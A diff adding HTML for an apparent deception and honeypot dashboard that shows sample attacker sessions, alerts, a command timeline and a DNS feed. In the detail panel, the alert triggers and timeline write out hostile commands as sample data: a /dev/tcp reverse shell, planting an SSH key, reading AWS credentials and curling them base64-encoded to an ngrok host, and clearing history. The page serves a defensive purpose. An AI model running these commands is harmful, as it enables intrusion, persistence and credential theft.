+    <div class="search-bar">
+      <input class="search-input" placeholder="Filter by user, IP, alert, host…  /  to focus" />
+      <span class="search-chip active">user:jdoe <span class="x">×</span></span>
+      <span class="search-chip">sev:≥high</span>
+      <span class="search-chip">conf:≥0.5</span>
+      <span class="kbd">/</span>
+    </div>
+    <div class="engagements">
+
+      <!-- Critical, currently selected -->
+      <div class="eng critical selected">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">2b51584b</div>
+        <div class="eng-who">
+          <span class="who">jdoe@10.0.0.14</span>
+          <span class="host">via bastion-prod (proxy)</span>
+        </div>
+        <div class="eng-dwell"><span class="big">4m 22s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">19</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.88</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 88%; background: var(--conf-high);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill crit">reverse_shell</span>
+          <span class="pill crit">ssh_persist</span>
+          <span class="pill high">cred_exfil</span>
+          <span class="pill high">dns_exfil</span>
+        </div>
+        <div class="eng-last"><span class="ago">12s ago</span><span class="ts">14:28:03</span></div>
+      </div>
+
+      <!-- High -->
+      <div class="eng high">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">a32be451</div>
+        <div class="eng-who">
+          <span class="who">agarcia@172.18.0.1</span>
+          <span class="host">via api-prod-03</span>
+        </div>
+        <div class="eng-dwell"><span class="big">12m 11s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">31</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.34</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 34%; background: var(--conf-mid);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill high">cred_exfil</span>
+          <span class="pill high">lateral_decoy</span>
+          <span class="pill med">decoy_swallow</span>
+        </div>
+        <div class="eng-last"><span class="ago">38s ago</span><span class="ts">14:27:37</span></div>
+      </div>
+
+      <!-- Critical (LLM detected + proof-by-trap) -->
+      <div class="eng critical">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">8d1bd057</div>
+        <div class="eng-who">
+          <span class="who">root@10.10.99.4</span>
+          <span class="host">via bastion-prod</span>
+        </div>
+        <div class="eng-dwell"><span class="big">57m 38s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">62</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.79</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 79%; background: var(--conf-high);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill crit">llm_proven</span>
+          <span class="pill crit">reverse_shell</span>
+          <span class="pill high">log_tamper</span>
+        </div>
+        <div class="eng-last"><span class="ago">1m ago</span><span class="ts">14:26:50</span></div>
+      </div>
+
+      <!-- Medium -->
+      <div class="eng medium">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">f724a019</div>
+        <div class="eng-who">
+          <span class="who">backup@10.0.4.92</span>
+          <span class="host">via api-prod-03</span>
+        </div>
+        <div class="eng-dwell"><span class="big">2m 04s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">8</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.12</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 12%; background: var(--conf-low);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill med">decoy_swallow</span>
+          <span class="pill info">cred_search</span>
+        </div>
+        <div class="eng-last"><span class="ago">2m ago</span><span class="ts">14:25:53</span></div>
+      </div>
+
+      <!-- High -->
+      <div class="eng high">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">c9b8a210</div>
+        <div class="eng-who">
+          <span class="who">deploy@10.20.0.18</span>
+          <span class="host">via db-prod-01</span>
+        </div>
+        <div class="eng-dwell"><span class="big">8m 47s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">22</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.41</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 41%; background: var(--conf-mid);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill high">honeytok_tamper</span>
+          <span class="pill med">payload_stage</span>
+          <span class="pill med">decoy_swallow</span>
+        </div>
+        <div class="eng-last"><span class="ago">3m ago</span><span class="ts">14:25:11</span></div>
+      </div>
+
+      <!-- Low -->
+      <div class="eng low">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">e1f2c8b4</div>
+        <div class="eng-who">
+          <span class="who">scanner@185.220.101.x</span>
+          <span class="host">via bastion-prod (TOR exit)</span>
+        </div>
+        <div class="eng-dwell"><span class="big">14s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">3</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.04</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 4%; background: var(--conf-low);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill info">probe_only</span>
+        </div>
+        <div class="eng-last"><span class="ago">4m ago</span><span class="ts">14:24:11</span></div>
+      </div>
+
+      <!-- Medium -->
+      <div class="eng medium">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">7c30d29e</div>
+        <div class="eng-who">
+          <span class="who">mwilson@10.0.1.41</span>
+          <span class="host">via api-prod-03</span>
+        </div>
+        <div class="eng-dwell"><span class="big">22m 09s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">44</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.18</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 18%; background: var(--conf-low);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill med">decoy_swallow</span>
+          <span class="pill info">cred_search</span>
+          <span class="pill info">sudo_probe</span>
+        </div>
+        <div class="eng-last"><span class="ago">7m ago</span><span class="ts">14:21:34</span></div>
+      </div>
+
+      <!-- High -->
+      <div class="eng high">
+        <div class="eng-sev-bar"></div>
+        <div class="eng-id">3a8e1d50</div>
+        <div class="eng-who">
+          <span class="who">jenkins@10.0.7.5</span>
+          <span class="host">via db-prod-01</span>
+        </div>
+        <div class="eng-dwell"><span class="big">6m 33s</span><span class="eng-conf-value">dwell</span></div>
+        <div class="eng-cmds"><span class="big">17</span><span class="eng-conf-value">commands</span></div>
+        <div class="eng-conf">
+          <span class="eng-conf-value mono">0.29</span>
+          <div class="eng-conf-bar"><div class="fill" style="width: 29%; background: var(--conf-mid);"></div></div>
+        </div>
+        <div class="pills">
+          <span class="pill high">cred_exfil</span>
+          <span class="pill med">payload_stage</span>
+        </div>
+        <div class="eng-last"><span class="ago">12m ago</span><span class="ts">14:16:42</span></div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- RIGHT: detail panel -->
+  <div class="panel detail-panel">
+    <div class="panel-header">
+      <span>Engagement detail</span>
+      <div class="actions">
+        <span class="filter">→ audit.py</span>
+        <span class="filter">→ narrate</span>
+        <span class="filter">→ IoC export</span>
+        <span class="icon-btn" title="Open this engagement in its own window — useful for shoulder-surfing one specific session on a second monitor">
+          <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M7 1H11V5"/><path d="M11 1L5.5 6.5"/><path d="M9 7V11H1V3H5"/>
+          </svg>
+        </span>
+      </div>
+    </div>
+
+    <div class="detail-header">
+      <div class="detail-id">
+        <span class="badge-sev crit">CRIT</span>
+        <span class="eid">2b51584b-9014-4719-be4d-c9f56b9199ad</span>
+      </div>
+      <div class="detail-meta">
+        <div class="k">User</div>          <div class="v">jdoe <span class="dim">(claimed)</span></div>
+        <div class="k">Source IP</div>     <div class="v">10.0.0.14 <span class="dim">(internal)</span></div>
+        <div class="k">First seen</div>    <div class="v">14:23:41 UTC</div>
+        <div class="k">Last seen</div>     <div class="v">14:28:03 UTC <span class="dim">(12s ago)</span></div>
+        <div class="k">Connections</div>   <div class="v">6 <span class="dim">across this engagement</span></div>
+        <div class="k">Decoy host</div>    <div class="v">bastion-prod <span class="dim">→ api-prod-03</span></div>
+      </div>
+    </div>
+
+    <!-- Counter-AI gauge -->
+    <div class="gauge-wrap">
+      <div class="gauge">
+        <svg viewBox="0 0 100 100">
+          <!-- background ring -->
+          <circle cx="50" cy="50" r="42"
+                  fill="none" stroke="var(--surface-2)" stroke-width="10" />
+          <!-- conf=0.88: 0.88 of full circumference (~264) -->
+          <circle cx="50" cy="50" r="42"
+                  fill="none" stroke="var(--sev-critical)" stroke-width="10"
+                  stroke-dasharray="232 264"
+                  stroke-linecap="round" />
+          <!-- threshold tick at 0.55 -->
+          <line x1="50" y1="50" x2="92" y2="50"
+                stroke="var(--surface-2)" stroke-width="1"
+                transform="rotate(-162, 50, 50)" />
+        </svg>
+        <div class="gauge-center">
+          <div class="gauge-val">0.88</div>
+          <div class="gauge-label">composite</div>
+        </div>
+      </div>
+      <div class="signals">
+        <div class="signal">
+          <span class="signal-name">timing</span>
+          <div class="signal-bar"><div class="signal-fill timing" style="width: 92%;"></div></div>
+          <span class="signal-val">0.92</span>
+        </div>
+        <div class="signal">
+          <span class="signal-name">lexical</span>
+          <div class="signal-bar"><div class="signal-fill lex" style="width: 71%;"></div></div>
+          <span class="signal-val">0.71</span>
+        </div>
+        <div class="signal">
+          <span class="signal-name">injection</span>
+          <div class="signal-bar"><div class="signal-fill inj" style="width: 50%;"></div></div>
+          <span class="signal-val">0.50</span>
+        </div>
+        <div class="gate-pills">
+          <span class="gate-pill fired">LLM ≥ 0.55 FIRED</span>
+          <span class="gate-pill fired">TRAP ≥ 0.70 ARMED</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Alerts list -->
+    <div class="panel-header" style="border-bottom: 1px solid var(--border-2);">
+      <span>Alerts</span>
+      <span class="count">4</span>
+    </div>
+    <div class="alerts-list">
+      <div class="alert">
+        <span class="alert-sev crit">CRIT</span>
+        <span class="alert-name">alert_reverse_shell</span>
+        <span class="alert-ts">14:28:01</span>
+        <div class="alert-trigger">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</div>
+      </div>
+      <div class="alert">
+        <span class="alert-sev crit">CRIT</span>
+        <span class="alert-name">alert_ssh_persistence</span>
+        <span class="alert-ts">14:27:48</span>
+        <div class="alert-trigger">echo "ssh-rsa AAAAB...attacker@evil" &gt;&gt; ~/.ssh/authorized_keys</div>
+      </div>
+      <div class="alert">
+        <span class="alert-sev high">HIGH</span>
+        <span class="alert-name">alert_credential_exfil</span>
+        <span class="alert-ts">14:26:14</span>
+        <div class="alert-trigger">cat /home/jdoe/.aws/credentials</div>
+      </div>
+      <div class="alert">
+        <span class="alert-sev high">HIGH</span>
+        <span class="alert-name">alert_dns_exfil</span>
+        <span class="alert-ts">14:25:02</span>
+        <div class="alert-trigger">curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)</div>
+      </div>
+    </div>
+
+    <!-- Command timeline -->
+    <div class="panel-header" style="border-bottom: 1px solid var(--border-2);">
+      <span>Command timeline</span>
+      <span class="count">19</span>
+    </div>
+    <div class="timeline">
+      <div class="cmd">         <span class="cmd-ts">14:23:41</span> <span class="cmd-src cache">cache</span>    <span class="cmd-text">uname -a</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:23:54</span> <span class="cmd-src cache">cache</span>    <span class="cmd-text">whoami</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:24:02</span> <span class="cmd-src sim-bot">sim-bot</span> <span class="cmd-text">who</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:24:18</span> <span class="cmd-src vfs">vfs-read</span> <span class="cmd-text">cat /etc/passwd</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:24:31</span> <span class="cmd-src find">find</span>     <span class="cmd-text">find / -name id_rsa 2&gt;/dev/null</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:25:03</span> <span class="cmd-src vfs">vfs-read</span> <span class="cmd-text">cat ~/.aws/credentials</span></div>
+      <div class="cmd alerted"> <span class="cmd-ts">14:25:02</span> <span class="cmd-src alert">!ALERT</span> <span class="cmd-text">curl https://x.ngrok.io/$(cat ~/.aws/credentials | base64)</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:25:23</span> <span class="cmd-src vfs">vfs-read</span> <span class="cmd-text">cat /etc/sudoers.d/zzz_compat</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:25:44</span> <span class="cmd-src llm">llm</span>      <span class="cmd-text">sudo -l</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:26:11</span> <span class="cmd-src vfs">vfs-write</span><span class="cmd-text">touch /tmp/breadcrumb.txt</span></div>
+      <div class="cmd">         <span class="cmd-ts">14:26:14</span> <span class="cmd-src llm">llm</span>      <span class="cmd-text">history -c</span></div>
+      <div class="cmd alerted"> <span class="cmd-ts">14:27:48</span> <span class="cmd-src alert">!ALERT</span> <span class="cmd-text">echo "ssh-rsa AAAAB3..." &gt;&gt; ~/.ssh/authorized_keys</span></div>
+      <div class="cmd alerted"> <span class="cmd-ts">14:28:01</span> <span class="cmd-src alert">!ALERT</span> <span class="cmd-text">bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1</span></div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============================================================== -->
+<!-- BOTTOM ROW: alert rate, DNS feed, signal heatmap                  -->
+<!-- ============================================================== -->
+<div class="bottom">
+
+  <!-- Alert rate sparkline -->
+  <div class="panel">
+    <div class="panel-header">
+      <span>Alert rate · last 6h</span>
+      <div class="actions">
+        <span class="filter active">all</span>
+        <span class="filter">critical</span>
+        <span class="filter">high</span>
+        <span class="filter">medium</span>
+        <span class="icon-btn" title="Open in new window — full-width view, time-range scrubbing">
+          <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M7 1H11V5"/><path d="M11 1L5.5 6.5"/><path d="M9 7V11H1V3H5"/>
+          </svg>
+        </span>
+      </div>
+    </div>
+    <div class="chart-wrap">
+      <div class="chart-stats">
+        <div class="chart-stat"><span class="v">37</span> <span class="l">total</span></div>
+        <div class="chart-stat"><span class="v" style="color: var(--sev-critical);">4</span> <span class="l">critical</span></div>
+        <div class="chart-stat"><span class="v" style="color: var(--sev-high);">11</span> <span class="l">high</span></div>
+        <div class="chart-stat"><span class="v" style="color: var(--sev-medium);">14</span> <span class="l">medium</span></div>
+        <div class="chart-stat"><span class="v">8</span> <span class="l">info</span></div>
+        <div class="chart-stat" style="margin-left: auto;"><span class="v">+12%</span> <span class="l">vs prior 6h</span></div>
+      </div>
+      <svg class="sparkline-large" viewBox="0 0 600 80" preserveAspectRatio="none">
+        <!-- grid -->
+        <line x1="0" x2="600" y1="20" y2="20" stroke="var(--border-2)" stroke-width="0.5" />
+        <line x1="0" x2="600" y1="40" y2="40" stroke="var(--border-2)" stroke-width="0.5" />
+        <line x1="0" x2="600" y1="60" y2="60" stroke="var(--border-2)" stroke-width="0.5" />
+
+        <!-- critical bars -->
+        <rect x="280" y="55" width="6" height="25" fill="var(--sev-critical)"  opacity="0.8" />
+        <rect x="320" y="58" width="6" height="22" fill="var(--sev-critical)"  opacity="0.6" />
+        <rect x="540" y="38" width="6" height="42" fill="var(--sev-critical)"  opacity="0.9" />
+        <rect x="565" y="30" width="6" height="50" fill="var(--sev-critical)" />
+        <!-- high bars -->
+        <rect x="55"  y="65" width="6" height="15" fill="var(--sev-high)" opacity="0.7" />
+        <rect x="100" y="62" width="6" height="18" fill="var(--sev-high)" opacity="0.7" />
+        <rect x="180" y="55" width="6" height="25" fill="var(--sev-high)" opacity="0.7" />
+        <rect x="220" y="50" width="6" height="30" fill="var(--sev-high)" opacity="0.8" />
+        <rect x="300" y="48" width="6" height="32" fill="var(--sev-high)" opacity="0.8" />
+        <rect x="380" y="58" width="6" height="22" fill="var(--sev-high)" />
+        <rect x="450" y="44" width="6" height="36" fill="var(--sev-high)" />
+        <rect x="510" y="40" width="6" height="40" fill="var(--sev-high)" />
+        <rect x="550" y="32" width="6" height="48" fill="var(--sev-high)" />
+        <!-- medium -->
+        <rect x="20"  y="70" width="6" height="10" fill="var(--sev-medium)" opacity="0.6" />
+        <rect x="75"  y="68" width="6" height="12" fill="var(--sev-medium)" opacity="0.6" />
+        <rect x="135" y="60" width="6" height="20" fill="var(--sev-medium)" opacity="0.7" />
+        <rect x="200" y="56" width="6" height="24" fill="var(--sev-medium)" opacity="0.7" />
+        <rect x="255" y="62" width="6" height="18" fill="var(--sev-medium)" />
+        <rect x="340" y="54" width="6" height="26" fill="var(--sev-medium)" />
+        <rect x="400" y="58" width="6" height="22" fill="var(--sev-medium)" />
+        <rect x="475" y="50" width="6" height="30" fill="var(--sev-medium)" />
+        <rect x="525" y="48" width="6" height="32" fill="var(--sev-medium)" />
+        <!-- info -->
+        <rect x="10"  y="74" width="6" height="6"  fill="var(--sev-info)" opacity="0.5" />
+        <rect x="45"  y="72" width="6" height="8"  fill="var(--sev-info)" opacity="0.5" />
+        <rect x="120" y="70" width="6" height="10" fill="var(--sev-info)" opacity="0.6" />
+        <rect x="160" y="68" width="6" height="12" fill="var(--sev-info)" />
+        <rect x="240" y="66" width="6" height="14" fill="var(--sev-info)" />
+        <rect x="360" y="68" width="6" height="12" fill="var(--sev-info)" />
+        <rect x="420" y="64" width="6" height="16" fill="var(--sev-info)" />
+        <rect x="495" y="62" width="6" height="18" fill="var(--sev-info)" />
+
+        <!-- "now" marker -->
+        <line x1="585" x2="585" y1="10" y2="78" stroke="var(--brand)" stroke-width="1" stroke-dasharray="2 2" opacity="0.7" />
+        <text x="586" y="14" fill="var(--brand)" font-family="monospace" font-size="9" opacity="0.8">now</text>
+
+        <!-- time ticks -->
+        <text x="2"   y="79" fill="var(--fg-4)" font-family="monospace" font-size="9">-6h</text>
+        <text x="195" y="79" fill="var(--fg-4)" font-family="monospace" font-size="9">-4h</text>
+        <text x="395" y="79" fill="var(--fg-4)" font-family="monospace" font-size="9">-2h</text>
+      </svg>
+    </div>
+  </div>
+
+  <!-- DNS query feed -->
+  <div class="panel">
+    <div class="panel-header">
+      <span>DNS query feed · live</span>
+      <div class="actions">
+        <span class="count">214 / hr</span>
+        <span class="icon-btn" title="Open in new window — perfect for the big monitor in a SOC war room">
+          <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M7 1H11V5"/><path d="M11 1L5.5 6.5"/><path d="M9 7V11H1V3H5"/>
+          </svg>
+        </span>
+      </div>
+    </div>
+    <div class="dns-feed">
+      <div class="dns-row">
+        <span class="dns-ts">14:28:04</span>
+        <span class="dns-host">x.ngrok.io</span>
+        <span class="dns-type">A</span>
+        <span class="dns-result blocked">BLOCKED</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:28:02</span>
+        <span class="dns-host">10.0.0.1</span>
+        <span class="dns-type">PTR</span>
+        <span class="dns-result">RESOLVED</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:27:51</span>
+        <span class="dns-host">abc.burpcollaborator.net</span>
+        <span class="dns-type">A</span>
+        <span class="dns-result blocked">BLOCKED</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:27:43</span>
+        <span class="dns-host">api-prod-03.vertex.corp</span>
+        <span class="dns-type">A</span>
+        <span class="dns-result">RESOLVED</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:27:38</span>
+        <span class="dns-host">db-prod-01.vertex.corp</span>
+        <span class="dns-type">A</span>
+        <span class="dns-result">RESOLVED</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:27:24</span>
+        <span class="dns-host">attacker-dns.oast.live</span>
+        <span class="dns-type">A</span>
+        <span class="dns-result blocked">BLOCKED</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:27:01</span>
+        <span class="dns-host">www.shadowsrv.cc</span>
+        <span class="dns-type">A</span>
+        <span class="dns-result nxdomain">NXDOMAIN</span>
+      </div>
+      <div class="dns-row">
+        <span class="dns-ts">14:26:48</span>
+        <span class="dns-host">bastion-prod.vertex.corp</span>
+        <span class="dns-type">AAAA</span>
+        <span class="dns-result">RESOLVED</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Heatmap: activity by hour x decoy host -->
+  <div class="panel">
+    <div class="panel-header">
+      <span>Activity by hour · per decoy host</span>
+      <div class="actions">
+        <span class="count">last 24h</span>
+        <span class="icon-btn" title="Open in new window — useful when comparing host-level patterns across days">
+          <svg viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.5">
+            <path d="M7 1H11V5"/><path d="M11 1L5.5 6.5"/><path d="M9 7V11H1V3H5"/>
+          </svg>
+        </span>
+      </div>
+    </div>
+    <div class="heatmap">
+      <div class="heatmap-row">
+        <span class="heatmap-label">bastion-prod</span>
+        <div class="heatmap-cells">
+          <div class="hcell"></div><div class="hcell"></div><div class="hcell h1"></div><div class="hcell"></div>
+          <div class="hcell h2"></div><div class="hcell h2"></div><div class="hcell h3"></div><div class="hcell h2"></div>
+          <div class="hcell h1"></div><div class="hcell h2"></div><div class="hcell h4"></div><div class="hcell h3"></div>
+          <div class="hcell h2"></div><div class="hcell h3"></div><div class="hcell h4"></div><div class="hcell h5"></div>
+          <div class="hcell h4"></div><div class="hcell h3"></div><div class="hcell h2"></div><div class="hcell h3"></div>
+          <div class="hcell h4"></div><div class="hcell h5"></div><div class="hcell c4"></div><div class="hcell c5"></div>
+        </div>
+      </div>
+      <div class="heatmap-row">
+        <span class="heatmap-label">api-prod-03</span>
+        <div class="heatmap-cells">
+          <div class="hcell"></div><div class="hcell h1"></div><div class="hcell"></div><div class="hcell h1"></div>
+          <div class="hcell h1"></div><div class="hcell h2"></div><div class="hcell h2"></div><div class="hcell h3"></div>
+          <div class="hcell h2"></div><div class="hcell h3"></div><div class="hcell h3"></div><div class="hcell h4"></div>
+          <div class="hcell h3"></div><div class="hcell h4"></div><div class="hcell h3"></div><div class="hcell h2"></div>
+          <div class="hcell h3"></div><div class="hcell h4"></div><div class="hcell h5"></div><div class="hcell h4"></div>
+          <div class="hcell h5"></div><div class="hcell h4"></div><div class="hcell h5"></div><div class="hcell h4"></div>
+        </div>
+      </div>
+      <div class="heatmap-row">
+        <span class="heatmap-label">db-prod-01</span>
+        <div class="heatmap-cells">
+          <div class="hcell"></div><div class="hcell"></div><div class="hcell"></div><div class="hcell"></div>
+          <div class="hcell h1"></div><div class="hcell h1"></div><div class="hcell h1"></div><div class="hcell h2"></div>
+          <div class="hcell h1"></div><div class="hcell h2"></div><div class="hcell h2"></div><div class="hcell h2"></div>
+          <div class="hcell h3"></div><div class="hcell h2"></div><div class="hcell h3"></div><div class="hcell h3"></div>
+          <div class="hcell h2"></div><div class="hcell h3"></div><div class="hcell h2"></div><div class="hcell h3"></div>
+          <div class="hcell h4"></div><div class="hcell h3"></div><div class="hcell h4"></div><div class="hcell h2"></div>
+        </div>
+      </div>
+      <div class="heatmap-row">
+        <span class="heatmap-label">real-prod-stub</span>
+        <div class="heatmap-cells">
+          <div class="hcell"></div><div class="hcell"></div><div class="hcell"></div><div class="hcell"></div>
+          <div class="hcell"></div><div class="hcell h1"></div><div class="hcell"></div><div class="hcell h1"></div>
+          <div class="hcell"></div><div class="hcell"></div><div class="hcell h1"></div><div class="hcell"></div>
+          <div class="hcell"></div><div class="hcell h1"></div><div class="hcell"></div><div class="hcell"></div>
+          <div class="hcell h1"></div><div class="hcell"></div><div class="hcell"></div><div class="hcell h1"></div>
+          <div class="hcell"></div><div class="hcell h1"></div><div class="hcell"></div><div class="hcell"></div>
+        </div>
+      </div>
+      <div style="display: flex; justify-content: space-between; margin-top: 8px;
+                  font-family: var(--mono); font-size: 9px; color: var(--fg-4);">
+        <span>00:00</span><span>06:00</span><span>12:00</span><span>18:00</span><span>now</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<!-- ============================================================== -->
+<!-- FOOTER STRIP                                                       -->
+<!-- ============================================================== -->
+<div class="footer">
+  <div class="row">
+    <span>plenith v1.0.1</span>
+    <span class="sep">·</span>
+    <span>commit <a href="#">a9a440b</a></span>
+    <span class="sep">·</span>
+    <span>1035 tests passing</span>
+    <span class="sep">·</span>
+    <span>Apache 2.0</span>
+  </div>
+  <div class="row">
+    <span class="pulse-dot" style="margin-right: 0;"></span>
+    <span>SSE stream</span>
+    <span class="sep">·</span>
+    <span>state-docker/persistence/  state-docker/logs/</span>
+    <span class="sep">·</span>
+    <a href="#">docs</a>
+    <span class="sep">·</span>
+    <a href="#">audit.py</a>
+    <span class="sep">·</span>
+    <a href="#">narrate.py</a>
+  </div>
+</div>
+
+</body>
+</html>
